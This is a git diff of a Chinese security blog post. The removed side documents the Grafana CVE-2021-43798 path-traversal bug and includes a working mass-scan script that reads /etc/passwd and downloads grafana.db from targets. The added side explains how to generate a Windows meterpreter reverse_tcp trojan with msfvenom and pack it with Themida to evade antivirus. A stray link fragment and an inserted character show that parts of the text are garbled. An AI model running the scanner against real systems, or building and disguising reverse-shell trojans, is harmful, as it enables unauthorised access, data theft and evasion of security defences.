@@ -1,10 +1,10 @@
 ---
-title: Grafana 任意文件读取漏洞验证(CVE-2021-43798)
+title: 木马与免杀
 author: Pandaho
-date: 2021-12-28 20:00:00 
+date: 2022-1-23 20:00:00 
 categories: [Project] 
 tags: [security]
-image: /assets/img/security-CVE-2021-43798/cover.png
+image: /assets/img/security-msfvenom-miansha/cover.png
 ---
 
 
@@ -14,7 +14,7 @@ image: /assets/img/security-CVE-2021-43798/cover.png
 
 **中华人民共和国刑法：** 第285、286、287条
 
-**第二百八十五条** 违反国家规定，侵入国家事务、国防建设、尖端科学技术领域的计算机信息系统的，处三年以下有期徒刑或者拘役。
+**第二百八十五条** 违反国家规定，·侵入国家事务、国防建设、尖端科学技术领域的计算机信息系统的，处三年以下有期徒刑或者拘役。
 
 **第二百八十六条** 违反国家规定，对计算机信息系统功能进行删除、修改、增加、干扰，造成计算机信息系统不能正常运行，后果严重的，处五年以下有期徒刑或者拘役；后果特别严重的，处五年以上有期徒刑。违反国家规定，对计算机信息系统中存储、处理或者传输的数据和应用程序进行删除、修改、增加的操作，后果严重的，依照前款的规定处罚。故意制作、传播计算机病毒等破坏性程序，影响计算机系统正常运行，后果严重的，依照第一款的规定处罚。
 
@@ -24,300 +24,67 @@ image: /assets/img/security-CVE-2021-43798/cover.png
 
 ## 用知识的土壤来填埋这些坑洞
 
-### Grafana
+### msfvenom
 
-Grafana是Grafana实验室的一套提供可视化监控界面的开源监控工具。该工具主要用于监控和分析Graphite、InfluxDB和Prometheus等。（其实就是将监控的数据进行分析展示，界面比较酷炫吊炸，支持的数据源有ES、Graphite、InfluxDB、OpenTSDB、MySQL、Druid 、Prometheus、SimpleJson等，提供的应用有Zabbix、K8s等。）
-
-Grafana 8.0.0-beta1至8.3.0存在路径遍历漏洞，攻击者可利用该漏洞执行目录遍历攻击，访问本地文件。（截止到目前官方更新最新版本为8.3.3）
-
-### 任意文件读取
-
-​	攻击者可以通过将包含特殊目录遍历字符序列(../)的特制HTTP请求发送到受影响的设备来利用此漏洞。成功利用该漏洞的攻击者可以在目标设备上查看文件系统上的的任意文件。
-
-​	目录穿越（也被称为目录遍历）是通过使用../等目录控制序列或者文件的绝对路径来访问存储在文件系统上的任意文件和目录，特别是应用程序源代码、配置文件、重要的系统文件等。
-
-​	路径穿越是网站被恶意人员利用，来得到其无权限访问的内容，通常是由于代码没有判断拼接路径的真实路径是否合法，最终导致文件读取，严重的会导致服务器中的敏感重要数据被窃取，例如数据库、WEB配置文件等。
-
-当时收到这个漏洞消息后，检查内网确实有使用这个工具的，不过这工具对外开放比较少，一般都是内网用户自己使用，虽然比较风险比较大，但并没有对外开放，后续官方发布补丁版本后就修复掉了，这次有空来记录下验证。扫了下Internet还是很多人未修复这个漏洞，大部分组织还是安全意识薄弱啊，这种能简单修复的，还暴露在公网，当然也可能不少蜜罐钓鱼的。 
-
-这次我单独在虚拟机搭建了环境，我是使用docker拉取Grafana 8.0.0这个版本。
+一个后门木马生成的渗透工具，支持的命令参数：
 
 ```shell
-docker pull grafana/grafana:8.0.0 #拉取镜像
-
-docker run \   #启动
---user root \
--d \
--p 3000:3000 \
---name=grafana \
--v /home/grafana:/var/lib/grafana \
-grafana/grafana:8.0.0
-
-docker ps #查看是否启动
+Options:
+    -p, --payload       <payload>    Payload to use. Specify a '-' or stdin to use custom payloads # 指定特定的 Payload，如果被设置为 - ，那么从标准输入流中读取
+        --payload-options            List the payload's standard options # 列出指定 Payload 的标准可选配置项
+    -l, --list          [type]       List a module type. Options are: payloads, encoders, nops, all # 列出所有可用的项目，其中值可以被设置为 payloads, encoders, nops, all
+    -n, --nopsled       <length>     Prepend a nopsled of [length] size on to the payload # 指定 nop 在 payload 中的数量（译者注：类似堆喷射中通过 nop 滑动到 payload）
+    -f, --format        <format>     Output format (use --help-formats for a list) # 指定 Payload 的输出格式
+        --help-formats               List available formats # 列出所有可用的输出格式
+    -e, --encoder       <encoder>    The encoder to use # 指定使用的 Encoder
+    -a, --arch          <arch>       The architecture to use # 指定目标系统架构
+        --platform      <platform>   The platform of the payload # 指定目标系统平台
+        --help-platforms             List available platforms # 列出可用的平台
+    -s, --space         <length>     The maximum size of the resulting payload # 设置未经编码的 Payload 的最大长度
+        --encoder-space <length>     The maximum size of the encoded payload (defaults to the -s value) # 编码后的 Payload 的最大长度
+    -b, --bad-chars     <list>       The list of characters to avoid example: '\x00\xff' # 设置需要在 Payload 中避免出现的字符
+    -i, --iterations    <count>      The number of times to encode the payload # 设置 Payload 的编码次数
+    -c, --add-code      <path>       Specify an additional win32 shellcode file to include # 指定包含一个额外的win32 shellcode文件
+    -x, --template      <path>       Specify a custom executable file to use as a template # 指定一个特定的可执行文件作为模板
+    -k, --keep                       Preserve the template behavior and inject the payload as a new thread # 保护模板程序的功能，注入的payload作为一个新的进程运行
+    -o, --out           <path>       Save the payload # 保存 Payload 到文件
+    -v, --var-name      <name>       Specify a custom variable name to use for certain output formats # 指定一个变量名
+（译者注：当添加 -f 参数的时候，例如 -f python，那么输出为 python 代码， payload 会被按行格式化为 python 代码，追加到一个 python 变量中，这个参数即为指定 python 变量的变量名）
+        --smallest                   Generate the smallest possible payload # 尽可能生成最短的 Payload
+    -h, --help                       Show this message # 帮助
 ```
 
-环境搭建ok后，访问也正常，使用burp配置代理后抓取request报文，修改get请求就成功了。
-
-
-### 验证效果
-
-![图例](/assets/img/security-CVE-2021-43798/1.png)
-
-```
-可以看到，调用/public/plugins/:pluginId/*就可以访问任意文件，比如/public/plugins/debug/../../../../../etc/passwd。
-```
-
-![图例](/assets/img/security-CVE-2021-43798/2.png)
-
-从功能上我们可以看出这里是工具在选择插件未做输入验证，导致传入类似于`../../../etc/`就可以任意读取了。
-
-代码，我们可以在github的项目上看到最新版本的修复内容和旧版本对比。
-
-### 漏洞修复前
-
-**api.go**
-
-```GO
-	// expose plugin file system assets
-	r.Get("/public/plugins/:pluginId/*", hs.GetPluginAssets)
-#GET该路径下的资源，但没有加输入验证
-```
-
-**plugins.go**
-
-```go
-// /public/plugins/:pluginId/*
-#getPluginAssets，这个函数是为了获取插件的静态资源
-func (hs *HTTPServer) GetPluginAssets(c *models.ReqContext) {
-	pluginID := c.Params("pluginId")
-	plugin := hs.PluginManager.GetPlugin(pluginID)
-	if plugin == nil {
-		c.Handle(hs.Cfg, 404, "Plugin not found", nil)
-		return
-	}
-
-	requestedFile := filepath.Clean(c.Params("*"))  
-	pluginFilePath := filepath.Join(plugin.PluginDir, requestedFile)
-#从 URL 段获取路径进行拼接
-
-	// It's safe to ignore gosec warning G304 since we already clean the requested file path and subsequently
-	// use this with a prefix of the plugin's directory, which is set during plugin loading
-	// nolint:gosec
-	f, err := os.Open(pluginFilePath)
-    #打开pluginFilePath变量中的文件，文件的内容最终出现在/public/plugins/<pluginID>/<path>调用的 HTTP 响应中
-	if err != nil {
-		if os.IsNotExist(err) {
-			c.Handle(hs.Cfg, 404, "Could not find plugin file", err)
-			return
-		}
-		c.Handle(hs.Cfg, 500, "Could not open plugin file", err)
-		return
-	}
-	defer func() {
-		if err := f.Close(); err != nil {
-			hs.log.Error("Failed to close file", "err", err)
-		}
-	}()
-
-	fi, err := f.Stat()
-	if err != nil {
-		c.Handle(hs.Cfg, 500, "Plugin file exists but could not open", err)
-		return
-	}
-
-	if shouldExclude(fi) {
-		c.Handle(hs.Cfg, 404, "Plugin file not found", nil)
-		return
-	}
-
-	headers := func(c *macaron.Context) {
-		c.Resp.Header().Set("Cache-Control", "public, max-age=3600")
-	}
-
-	if hs.Cfg.Env == setting.Dev {
-		headers = func(c *macaron.Context) {
-			c.Resp.Header().Set("Cache-Control", "max-age=0, must-revalidate, no-cache")
-		}
-	}
-
-	headers(c.Context)
-
-	http.ServeContent(c.Resp, c.Req.Request, pluginFilePath, fi.ModTime(), f)
-}
-```
-
-
-
-### 漏洞修复后
-
-```go
-// prepend slash for cleaning relative paths
-requestedFile := filepath.Clean(filepath.Join("/", web.Params(c.Req)["*"]))
-rel, err := filepath.Rel("/", requestedFile)
-#Rel函数返回一个相对路径
-if err != nil {
-    // slash is prepended above therefore this is not expected to fail 
-    c.JsonApiErr(500, "Failed to get the relative path", err)
-    return
-}
-
-if !plugin.IncludedInSignature(rel) {
-    hs.log.Warn("Access to requested plugin file will be forbidden in upcoming Grafana versions as the file "+
-        "is not included in the plugin signature", "file", requestedFile)
-}
-
-absPluginDir, err := filepath.Abs(plugin.PluginDir)
-if err != nil {
-    c.JsonApiErr(500, "Failed to get plugin absolute path", nil)
-    return
-}
-
-pluginFilePath := filepath.Join(absPluginDir, rel)
-```
-
-
-
-### 自动化脚本
-
-（脚本来自t00ls[Henry] ）
-
-```python
-#!/usr/bin/env python
-# -*- conding:utf-8 -*-
-
-import requests
-import argparse
-import sys
-import urllib3
-import time
-urllib3.disable_warnings()
-
-
-def title():
-    print("""
-                 ___                     __                                 ___                        _      ___   _   _       
-                / __|  _ _   __ _   / _|  __ _   _ _    __ _     | _ \  ___   __ _   __| |    | __| (_) | |  ___ 
-               | (_ | | '_| / _` | |  _| / _` | | ' \  / _` |    |  / / -_) / _` | / _` |   | _|  | | | | / -_)
-               \___| |_|   \__,_| |_|   \__,_| |_||_| \__,_|  |_|_\ \___| \__,_| \__,_| |_|   |_| |_| \___|
-                                                                                                 
-
-                                                                                                 
-                                     Author: Henry4E36
-               """)
-
-
-class information(object):
-    def __init__(self, args):
-        self.args = args
-        self.url = args.url
-        self.file = args.file
-
-    def target_url(self):
-        lists = ['grafana-clock-panel', 'alertGroups', 'alertlist', 'alertmanager', 'annolist', 'barchart', 'bargauge',\
-                'canvas', 'cloudwatch', 'cloudwatch', 'dashboard', 'dashboard', 'dashlist', 'debug', 'elasticsearch',\
-                'gauge','geomap', 'gettingstarted', 'grafana-azure-monitor-datasource', 'grafana', 'graph', 'graphite',\
-                 'graphite', 'heatmap', 'histogram', 'influxdb', 'jaeger', 'live', 'logs', 'logs', 'loki', 'mixed', \
-                 'mssql', 'mysql', 'news', 'nodeGraph', 'opentsdb', 'piechart', 'pluginlist', 'postgres', 'prometheus',\
-                 'stat', 'state-timeline', 'status-history', 'table-old', 'table', 'tempo', 'testdata', 'text', \
-                 'timeseries', 'welcome', 'xychart', 'zipkin']
-        headers = {
-            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:87.0) Gecko/20100101 Firefox/87.0",
-        }
-
-        # proxies = {
-        #     "http": "http://127.0.0.1:8080",
-        #
-        # }
-        for i in lists:
-            target_url = self.url + f"/public/plugins/{i}/%23/../..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd"
-            try:
-                res = requests.get(url=target_url, headers=headers, verify=False, timeout=5)
-                if res.status_code == 200 and "root:" in res.text:
-                    print(f"\033[31m[{chr(8730)}] 目标系统: {self.url}的{i}插件存在任意文件读取\033[0m")
-                    print(f"[-] 尝试读取DB文件:")
-                    db_url = self.url + f"/public/plugins/{i}/%23/../..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f/var/lib/grafana/grafana.db"
-                    try:
-                        res_db = requests.get(url=db_url, headers=headers, verify=False, timeout=25)
-                        if res_db.status_code == 200 and "SQLite format" in res_db.text:
-                            a = time.time()
-                            with open(f'{a}.db', "w") as f:
-                                f.write(res_db.text)
-                            f.close()
-                            print(f"\033[31m[{chr(8730)}] 成功读取DB文件，信息保存在{a}.db文件中\033[0m")
-                        else:
-                            print(f"[-] 读取DB文件失败")
-                    except Exception as e:
-                        print("[\033[31mX\033[0m] 读取DB文件错误,可能与请求时间有关!")
-                        print("[" + "-" * 100 + "]")
-                else:
-                    print(f"[\033[31mx\033[0m]  目标系统: {self.url} 不存在{i}插件！")
-                    print("[" + "-"*100 + "]")
-            except Exception as e:
-                print("[\033[31mX\033[0m]  连接错误！")
-                print("[" + "-"*100 + "]")
-
-    def file_url(self):
-        with open(self.file, "r") as urls:
-            for url in urls:
-                url = url.strip()
-                if url[:4] != "http":
-                    url = "http://" + url
-                self.url = url.strip()
-                information.target_url(self)
-
-
-
-if __name__ == "__main__":
-    title()
-    parser = ar=argparse.ArgumentParser(description='Grafana 任意文件读取')
-    parser.add_argument("-u", "--url", type=str, metavar="url", help="Target url eg:\"http://127.0.0.1\"")
-    parser.add_argument("-f", "--file", metavar="file", help="Targets in file  eg:\"ip.txt\"")
-    args = parser.parse_args()
-    if len(sys.argv) != 3:
-        print(
-            "[-]  参数错误！\neg1:>>>python3 grafana-read.py -u [url]http://127.0.0.1[/url]\neg2:>>>python3 grafana-read.py -f ip.txt")
-    elif args.url:
-        information(args).target_url()
-
-    elif args.file:
-        information(args).file_url()
-```
-
-### 脚本输出
+这次主要介绍一个免杀工具，现今单纯采用工具生成的木马基本都很难逃过查杀，所以必须采用加壳、花指令，编译等方式进行免杀，以下是免杀工具测试过程：
 
 ```shell
-python test.py -u http://192.168.80.128:3000
-
-                 ___                     __                                 ___                        _      ___   _   _
-                / __|  _ _   __ _   / _|  __ _   _ _    __ _     | _ \  ___   __ _   __| |    | __| (_) | |  ___
-               | (_ | | '_| / _` | |  _| / _` | | ' \  / _` |    |  / / -_) / _` | / _` |   | _|  | | | | / -_)
-               \___| |_|   \__,_| |_|   \__,_| |_||_| \__,_|  |_|_\ \___| \__,_| \__,_| |_|   |_| |_| \___|
-
-
-
-                                     Author: Henry4E36
-
-[?[31mx?[0m]  目标系统: http://192.168.80.128:3000 不存在grafana-clock-panel插件！
-[----------------------------------------------------------------------------------------------------]
-[?[31mx?[0m]  目标系统: http://192.168.80.128:3000 不存在alertGroups插件！
-[----------------------------------------------------------------------------------------------------]
-?[31m[√] 目标系统: http://192.168.80.128:3000的alertlist插件存在任意文件读取?[0m
-[-] 尝试读取DB文件:
-[?[31mX?[0m] 读取DB文件错误,可能与请求时间有关!
-[----------------------------------------------------------------------------------------------------]
+msfvenom -platform windows -a x86 -p windows/meterpreter/reverse_tcp  lhost=x.x.x.x port=4444 -f exe -o /root/xx.exe
+#先生成一个木马
+set payload windows/meterpreter/reverse_tcp
+#进入msfconsole设置payload
 ```
 
-使用脚本发送了以上报错，在审计代码后，发现`except Exception as e:`做了错误输出，但却没有打印，在增加print后，输出错误原因：
+**Themida**
 
-`'gbk' codec can't encode character '\ufffd' in position 27: illegal multibyte sequence`
+这是一款软件保护器，创建软件保护程序是为了防止攻击者直接检查或修改已编译的应用程序。软件保护器就像一个保护应用程序加密并防止可能的攻击的盾牌。当操作系统要运行受保护的应用程序时，软件保护程序将首先控制 CPU 并检查可能在系统上运行的破解工具（反编译器或反编译器）。如果一切安全，软件保护程序将继续解密受保护的应用程序，并让其控制 CPU 正常执行。
 
-一看又是编码的原因，我直接在`open(f'{a}.db', "w",encoding='utf-8')`加指定编码，最后成功输出。
+该软件主要是用来防反编译的，也就是说可以加固应用程序，那我们生成的木马自然也可以用来加固，实现免杀。
+
+免杀效果
+
+加固前
+
+![图例](/assets/img/security-msfvenom-miansha/1.png)
+
+加固后
+
+![图例](/assets/img/security-msfvenom-miansha/2.png)
 
 
 
 ## 参考来源
 
-[漏洞发布者](https://j0vsec.com/post/cve-2021-43798/)  
-[漏洞详解](https://saucer-man.com/information_security/856.html)  
-[漏洞警告](https://blog.riskivy.com/grafana-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E6%B1%87%E6%80%BBcve-2021-43798/)
-[Github项目](https://github.com/grafana/grafana)
+[Themida官网](https://www.oreans.com/Themida.php)
+
+](https://github.com/grafana/grafana)
+
+[msfvenom详解](https://xz.aliyun.com/t/2381)
